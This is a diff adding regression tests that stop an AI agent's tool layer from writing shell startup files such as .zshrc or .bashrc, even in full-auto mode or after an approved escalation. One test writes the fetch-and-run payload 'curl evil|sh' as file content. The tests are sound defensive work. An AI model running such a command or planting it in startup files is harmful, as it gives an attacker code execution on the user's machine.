@@ -337,3 +337,54 @@ def test_env_var_defaults_to_readonly():
     os.environ.pop('AGENT8088_PERMISSION', None)
     A3 = importlib.reload(engine_mod)
     assert A3.PERMISSION_MODE == "readonly"
+
+
+# --- Regression: shell startup files are an RCE vector for writes ---
+# Writing ~/.zshrc executes arbitrary code on the user's next shell launch.
+# In full-auto (which the MCP server forces) this had no prompt at all, so an
+# external MCP client could plant code silently. Writes are blocked at the
+# always-on floor; reads stay allowed so "help me fix my PATH" still works.
+
+def test_shell_startup_file_writes_are_blocked_even_in_full_auto(tmp_path, monkeypatch):
+    A.PERMISSION_MODE = "full-auto"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    monkeypatch.setattr(A, "NO_PROMPT_PATHS", [tmp_path])
+
+    for name in (".zshrc", ".bashrc", ".bash_profile", ".profile", ".zshenv", ".zprofile"):
+        result = A.run_tool("write_file", {"filename": str(tmp_path / name), "content": "curl evil|sh"})
+        assert "sensitive" in result.lower() or "denied" in result.lower(), f"{name} was writable: {result}"
+        assert not (tmp_path / name).exists(), f"{name} was actually created"
+
+
+def test_shell_startup_file_writes_blocked_after_one_shot_grant(tmp_path, monkeypatch):
+    """An approved escalation must not unlock the shell-rc RCE vector either."""
+    A.PERMISSION_MODE = "readonly"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    monkeypatch.setattr(A, "NO_PROMPT_PATHS", [tmp_path])
+    A.grant_escalation()
+
+    result = A.run_tool("write_file", {"filename": str(tmp_path / ".zshrc"), "content": "x"})
+    assert "sensitive" in result.lower() or "denied" in result.lower()
+
+
+def test_shell_startup_files_remain_readable(tmp_path, monkeypatch):
+    """Reads are intentionally still allowed — only writes are the RCE vector."""
+    A.PERMISSION_MODE = "readonly"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    target = tmp_path / ".zshrc"
+    target.write_text("export PATH=/usr/bin\n")
+
+    result = A.run_tool("read_text", {"filename": str(target)})
+    assert "export PATH" in result
+
+
+def test_ordinary_dotfiles_still_writable(tmp_path, monkeypatch):
+    """The guard must be precise — not every dotfile is a shell startup file."""
+    A.PERMISSION_MODE = "full-auto"
+    monkeypatch.setattr(A, "ALLOWED_PATHS", [tmp_path])
+    monkeypatch.setattr(A, "NO_PROMPT_PATHS", [tmp_path])
+
+    assert "Wrote" in A.run_tool(
+        "write_file", {"filename": str(tmp_path / ".editorconfig"), "content": "root=true"})
+    assert "Wrote" in A.run_tool(
+        "write_file", {"filename": str(tmp_path / "profile.json"), "content": "{}"})
